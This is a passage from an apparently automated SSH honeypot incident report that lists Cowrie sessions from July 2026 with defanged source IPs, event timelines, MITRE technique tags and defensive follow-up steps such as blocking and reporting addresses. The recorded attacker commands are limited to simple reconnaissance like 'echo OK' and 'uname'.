| `2026-07-08 22:14:24` | `cowrie.command.failed` |
| `2026-07-08 22:14:25` | `cowrie.log.closed` |
| `2026-07-08 22:14:25` | `cowrie.session.params` |
| `2026-07-08 22:14:25` | `cowrie.command.input` |
| `2026-07-08 22:14:25` | `cowrie.session.file_download` |
| `2026-07-08 22:14:25` | `cowrie.log.closed` |
| `2026-07-08 22:14:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.53.215[.]134` to AbuseIPDB if not already reported
- [ ] Block `177.53.215[.]134` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-101b19d881b5

| Field | Detail |
|---|---|
| **Source IP** | `177.53.215[.]134` |
| **First Seen** | 2026-07-08 22:14 |
| **Last Seen** | 2026-07-08 22:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 22:14:26` | `cowrie.session.connect` |
| `2026-07-08 22:14:26` | `cowrie.client.version` |
| `2026-07-08 22:14:26` | `cowrie.client.kex` |
| `2026-07-08 22:14:26` | `cowrie.login.success` |
| `2026-07-08 22:14:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.53.215[.]134` to AbuseIPDB if not already reported
- [ ] Block `177.53.215[.]134` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c36eb9a34391

| Field | Detail |
|---|---|
| **Source IP** | `177.53.215[.]134` |
| **First Seen** | 2026-07-08 22:14 |
| **Last Seen** | 2026-07-08 22:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 22:14:26` | `cowrie.session.connect` |
| `2026-07-08 22:14:26` | `cowrie.client.version` |
| `2026-07-08 22:14:26` | `cowrie.client.kex` |
| `2026-07-08 22:14:27` | `cowrie.login.success` |
| `2026-07-08 22:14:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.53.215[.]134` to AbuseIPDB if not already reported
- [ ] Block `177.53.215[.]134` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee195ad95aeb

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]114` |
| **First Seen** | 2026-07-08 22:16 |
| **Last Seen** | 2026-07-08 22:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 22:16:25` | `cowrie.session.connect` |
| `2026-07-08 22:16:25` | `cowrie.client.version` |
| `2026-07-08 22:16:25` | `cowrie.client.kex` |
| `2026-07-08 22:16:25` | `cowrie.login.success` |
| `2026-07-08 22:16:26` | `cowrie.session.params` |
| `2026-07-08 22:16:26` | `cowrie.command.input` |
| `2026-07-08 22:16:26` | `cowrie.log.closed` |
| `2026-07-08 22:16:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]114` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c5e2380c5de

| Field | Detail |
|---|---|
| **Source IP** | `104.248.143[.]134` |
| **First Seen** | 2026-07-08 22:19 |
| **Last Seen** | 2026-07-08 22:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 22:19:13` | `cowrie.session.connect` |
| `2026-07-08 22:19:13` | `cowrie.client.version` |
| `2026-07-08 22:19:13` | `cowrie.client.kex` |
| `2026-07-08 22:19:14` | `cowrie.login.success` |
| `2026-07-08 22:19:15` | `cowrie.session.params` |
| `2026-07-08 22:19:15` | `cowrie.command.input` |
| `2026-07-08 22:19:15` | `cowrie.log.closed` |
| `2026-07-08 22:19:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.248.143[.]134` to AbuseIPDB if not already reported
- [ ] Block `104.248.143[.]134` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11eebdf43c07

| Field | Detail |
|---|---|
| **Source IP** | `113.140.95[.]250` |
| **First Seen** | 2026-07-08 22:19 |
| **Last Seen** | 2026-07-08 22:19 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 22:19:41` | `cowrie.session.connect` |
| `2026-07-08 22:19:42` | `cowrie.client.version` |
| `2026-07-08 22:19:42` | `cowrie.client.kex` |
| `2026-07-08 22:19:44` | `cowrie.login.success` |
| `2026-07-08 22:19:44` | `cowrie.direct-tcpip.request` |
| `2026-07-08 22:19:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.140.95[.]250` to AbuseIPDB if not already reported
- [ ] Block `113.140.95[.]250` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a58477938984

| Field | Detail |
|---|---|
| **Source IP** | `49.124.149[.]208` |
| **First Seen** | 2026-07-08 22:19 |
| **Last Seen** | 2026-07-08 22:20 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 22:19:54` | `cowrie.session.connect` |
| `2026-07-08 22:19:54` | `cowrie.client.version` |
| `2026-07-08 22:19:55` | `cowrie.client.kex` |
| `2026-07-08 22:19:57` | `cowrie.login.success` |
| `2026-07-08 22:19:58` | `cowrie.direct-tcpip.request` |
| `2026-07-08 22:20:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.149[.]208` to AbuseIPDB if not already reported
- [ ] Block `49.124.149[.]208` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4de7c5c90e43

| Field | Detail |
|---|---|
| **Source IP** | `36.64.211[.]93` |
| **First Seen** | 2026-07-08 22:19 |
| **Last Seen** | 2026-07-08 22:20 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 22:19:56` | `cowrie.session.connect` |
| `2026-07-08 22:19:58` | `cowrie.client.version` |
| `2026-07-08 22:19:58` | `cowrie.client.kex` |
| `2026-07-08 22:20:01` | `cowrie.login.success` |
| `2026-07-08 22:20:02` | `cowrie.direct-tcpip.request` |
| `2026-07-08 22:20:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.64.211[.]93` to AbuseIPDB if not already reported
- [ ] Block `36.64.211[.]93` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c857899f8439

| Field | Detail |
|---|---|
| **Source IP** | `200.89.159[.]59` |
| **First Seen** | 2026-07-08 22:20 |
| **Last Seen** | 2026-07-08 22:20 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 22:20:14` | `cowrie.session.connect` |
| `2026-07-08 22:20:15` | `cowrie.client.version` |
| `2026-07-08 22:20:15` | `cowrie.client.kex` |
| `2026-07-08 22:20:18` | `cowrie.login.success` |
| `2026-07-08 22:20:19` | `cowrie.direct-tcpip.request` |
| `2026-07-08 22:20:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.89.159[.]59` to AbuseIPDB if not already reported
- [ ] Block `200.89.159[.]59` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f4fa8d278e6

| Field | Detail |
|---|---|
| **Source IP** | `116.48.150[.]115` |
| **First Seen** | 2026-07-08 22:21 |
| **Last Seen** | 2026-07-08 22:22 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 22:21:53` | `cowrie.session.connect` |
| `2026-07-08 22:21:54` | `cowrie.client.version` |
| `2026-07-08 22:21:54` | `cowrie.client.kex` |
| `2026-07-08 22:21:56` | `cowrie.login.success` |
| `2026-07-08 22:21:57` | `cowrie.direct-tcpip.request` |
| `2026-07-08 22:22:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.48.150[.]115` to AbuseIPDB if not already reported
- [ ] Block `116.48.150[.]115` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5c55ff3635b

| Field | Detail |
|---|---|
| **Source IP** | `189.52.52[.]162` |
| **First Seen** | 2026-07-08 22:22 |
| **Last Seen** | 2026-07-08 22:22 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 22:22:07` | `cowrie.session.connect` |
| `2026-07-08 22:22:08` | `cowrie.client.version` |
| `2026-07-08 22:22:08` | `cowrie.client.kex` |
| `2026-07-08 22:22:10` | `cowrie.login.success` |
| `2026-07-08 22:22:12` | `cowrie.direct-tcpip.request` |
| `2026-07-08 22:22:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.52.52[.]162` to AbuseIPDB if not already reported
- [ ] Block `189.52.52[.]162` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-379064c09289

| Field | Detail |
|---|---|
| **Source IP** | `178.178.222[.]55` |
| **First Seen** | 2026-07-08 22:23 |
| **Last Seen** | 2026-07-08 22:23 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 22:23:17` | `cowrie.session.connect` |
| `2026-07-08 22:23:18` | `cowrie.client.version` |
| `2026-07-08 22:23:18` | `cowrie.client.kex` |
| `2026-07-08 22:23:19` | `cowrie.login.success` |
| `2026-07-08 22:23:20` | `cowrie.direct-tcpip.request` |
| `2026-07-08 22:23:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.222[.]55` to AbuseIPDB if not already reported
- [ ] Block `178.178.222[.]55` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cec10a5fa01c

| Field | Detail |
|---|---|
| **Source IP** | `177.72.87[.]7` |
| **First Seen** | 2026-07-08 22:26 |
| **Last Seen** | 2026-07-08 22:26 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 22:26:11` | `cowrie.session.connect` |
| `2026-07-08 22:26:12` | `cowrie.client.version` |
| `2026-07-08 22:26:12` | `cowrie.client.kex` |
| `2026-07-08 22:26:15` | `cowrie.login.success` |
| `2026-07-08 22:26:16` | `cowrie.direct-tcpip.request` |
| `2026-07-08 22:26:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.72.87[.]7` to AbuseIPDB if not already reported
- [ ] Block `177.72.87[.]7` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cabb5c7a753f

| Field | Detail |
|---|---|
| **Source IP** | `211.178.165[.]251` |
| **First Seen** | 2026-07-08 22:29 |
| **Last Seen** | 2026-07-08 22:29 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 22:29:32` | `cowrie.session.connect` |
| `2026-07-08 22:29:33` | `cowrie.client.version` |
| `2026-07-08 22:29:33` | `cowrie.client.kex` |
| `2026-07-08 22:29:35` | `cowrie.login.success` |
| `2026-07-08 22:29:36` | `cowrie.direct-tcpip.request` |
| `2026-07-08 22:29:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.178.165[.]251` to AbuseIPDB if not already reported
- [ ] Block `211.178.165[.]251` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7ae37848b86

| Field | Detail |
|---|---|
| **Source IP** | `60.18.139[.]82` |
| **First Seen** | 2026-07-08 22:29 |
| **Last Seen** | 2026-07-08 22:29 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 22:29:41` | `cowrie.session.connect` |
| `2026-07-08 22:29:42` | `cowrie.client.version` |
| `2026-07-08 22:29:42` | `cowrie.client.kex` |
| `2026-07-08 22:29:44` | `cowrie.login.success` |
| `2026-07-08 22:29:44` | `cowrie.direct-tcpip.request` |
| `2026-07-08 22:29:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.18.139[.]82` to AbuseIPDB if not already reported
- [ ] Block `60.18.139[.]82` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00be8758e815

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-08 22:32 |
| **Last Seen** | 2026-07-08 22:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 22:32:23` | `cowrie.session.connect` |
| `2026-07-08 22:32:23` | `cowrie.client.version` |
| `2026-07-08 22:32:24` | `cowrie.client.kex` |
| `2026-07-08 22:32:24` | `cowrie.login.success` |
| `2026-07-08 22:32:24` | `cowrie.direct-tcpip.request` |
| `2026-07-08 22:32:24` | `cowrie.direct-tcpip.data` |
| `2026-07-08 22:32:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00e8e87484ac

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-08 22:33 |
| **Last Seen** | 2026-07-08 22:34 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 22:33:51` | `cowrie.session.connect` |
| `2026-07-08 22:33:52` | `cowrie.client.version` |
| `2026-07-08 22:33:52` | `cowrie.client.kex` |
| `2026-07-08 22:33:59` | `cowrie.login.success` |
| `2026-07-08 22:34:01` | `cowrie.session.params` |
| `2026-07-08 22:34:01` | `cowrie.command.input` |
| `2026-07-08 22:34:03` | `cowrie.log.closed` |
| `2026-07-08 22:34:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2220cd2bf492

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]114` |
| **First Seen** | 2026-07-08 22:37 |
| **Last Seen** | 2026-07-08 22:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 22:37:23` | `cowrie.session.connect` |
| `2026-07-08 22:37:23` | `cowrie.client.version` |
| `2026-07-08 22:37:23` | `cowrie.client.kex` |
| `2026-07-08 22:37:24` | `cowrie.login.success` |
| `2026-07-08 22:37:24` | `cowrie.session.params` |
| `2026-07-08 22:37:24` | `cowrie.command.input` |
| `2026-07-08 22:37:25` | `cowrie.log.closed` |
| `2026-07-08 22:37:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]114` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb58a8fa3b71

| Field | Detail |
|---|---|
| **Source IP** | `46.101.223[.]226` |
| **First Seen** | 2026-07-08 22:37 |
| **Last Seen** | 2026-07-08 22:37 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 22:37:44` | `cowrie.session.connect` |
| `2026-07-08 22:37:44` | `cowrie.client.version` |
| `2026-07-08 22:37:44` | `cowrie.client.kex` |
| `2026-07-08 22:37:45` | `cowrie.login.success` |
| `2026-07-08 22:37:46` | `cowrie.session.params` |
| `2026-07-08 22:37:46` | `cowrie.command.input` |
| `2026-07-08 22:37:46` | `cowrie.log.closed` |
| `2026-07-08 22:37:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.101.223[.]226` to AbuseIPDB if not already reported
- [ ] Block `46.101.223[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96d277369578

| Field | Detail |
|---|---|
| **Source IP** | `46.101.223[.]226` |
| **First Seen** | 2026-07-08 22:38 |
| **Last Seen** | 2026-07-08 22:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 22:38:04` | `cowrie.session.connect` |
| `2026-07-08 22:38:04` | `cowrie.client.version` |
| `2026-07-08 22:38:04` | `cowrie.client.kex` |
| `2026-07-08 22:38:04` | `cowrie.login.success` |
| `2026-07-08 22:38:05` | `cowrie.session.params` |
| `2026-07-08 22:38:05` | `cowrie.command.input` |
| `2026-07-08 22:38:05` | `cowrie.log.closed` |
| `2026-07-08 22:38:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.101.223[.]226` to AbuseIPDB if not already reported
- [ ] Block `46.101.223[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34ac31a5f4bd

| Field | Detail |
|---|---|
| **Source IP** | `111.70.23[.]240` |
| **First Seen** | 2026-07-08 22:44 |
| **Last Seen** | 2026-07-08 22:44 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 22:44:26` | `cowrie.session.connect` |
| `2026-07-08 22:44:27` | `cowrie.client.version` |
| `2026-07-08 22:44:27` | `cowrie.client.kex` |
| `2026-07-08 22:44:29` | `cowrie.login.success` |
| `2026-07-08 22:44:29` | `cowrie.direct-tcpip.request` |
| `2026-07-08 22:44:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.23[.]240` to AbuseIPDB if not already reported
- [ ] Block `111.70.23[.]240` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62ec990fdcb0

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-08 22:44 |
| **Last Seen** | 2026-07-08 22:45 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 22:44:51` | `cowrie.session.connect` |
| `2026-07-08 22:44:53` | `cowrie.client.version` |
| `2026-07-08 22:44:53` | `cowrie.client.kex` |
| `2026-07-08 22:44:58` | `cowrie.login.success` |
| `2026-07-08 22:45:01` | `cowrie.session.params` |
| `2026-07-08 22:45:01` | `cowrie.command.input` |
| `2026-07-08 22:45:03` | `cowrie.log.closed` |
| `2026-07-08 22:45:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c651118581b0

| Field | Detail |
|---|---|
| **Source IP** | `103.68.52[.]210` |
| **First Seen** | 2026-07-08 22:45 |
| **Last Seen** | 2026-07-08 22:45 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 22:45:02` | `cowrie.session.connect` |
| `2026-07-08 22:45:03` | `cowrie.client.version` |
| `2026-07-08 22:45:03` | `cowrie.client.kex` |
| `2026-07-08 22:45:05` | `cowrie.login.success` |
| `2026-07-08 22:45:06` | `cowrie.direct-tcpip.request` |
| `2026-07-08 22:45:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.68.52[.]210` to AbuseIPDB if not already reported
- [ ] Block `103.68.52[.]210` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53f94b3c565f

| Field | Detail |
|---|---|
| **Source IP** | `111.171.127[.]190` |
| **First Seen** | 2026-07-08 22:45 |
| **Last Seen** | 2026-07-08 22:45 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 22:45:12` | `cowrie.session.connect` |
| `2026-07-08 22:45:12` | `cowrie.client.version` |
| `2026-07-08 22:45:12` | `cowrie.client.kex` |
| `2026-07-08 22:45:15` | `cowrie.login.success` |
| `2026-07-08 22:45:15` | `cowrie.direct-tcpip.request` |
| `2026-07-08 22:45:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.171.127[.]190` to AbuseIPDB if not already reported
- [ ] Block `111.171.127[.]190` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-defaee00de2d

| Field | Detail |
|---|---|
| **Source IP** | `66.45.144[.]201` |
| **First Seen** | 2026-07-08 22:47 |
| **Last Seen** | 2026-07-08 22:47 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 22:47:18` | `cowrie.session.connect` |
| `2026-07-08 22:47:18` | `cowrie.client.version` |
| `2026-07-08 22:47:18` | `cowrie.client.kex` |
| `2026-07-08 22:47:20` | `cowrie.login.success` |
| `2026-07-08 22:47:20` | `cowrie.direct-tcpip.request` |
| `2026-07-08 22:47:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `66.45.144[.]201` to AbuseIPDB if not already reported
- [ ] Block `66.45.144[.]201` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-797def88a5b5

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]114` |
| **First Seen** | 2026-07-08 22:47 |
| **Last Seen** | 2026-07-08 22:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 22:47:59` | `cowrie.session.connect` |
| `2026-07-08 22:47:59` | `cowrie.client.version` |
| `2026-07-08 22:47:59` | `cowrie.client.kex` |
| `2026-07-08 22:47:59` | `cowrie.login.success` |
| `2026-07-08 22:48:00` | `cowrie.session.params` |
| `2026-07-08 22:48:00` | `cowrie.command.input` |
| `2026-07-08 22:48:00` | `cowrie.log.closed` |
| `2026-07-08 22:48:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]114` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8149b332bf7c

| Field | Detail |
|---|---|
| **Source IP** | `185.2.228[.]48` |
| **First Seen** | 2026-07-08 22:51 |
| **Last Seen** | 2026-07-08 22:51 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
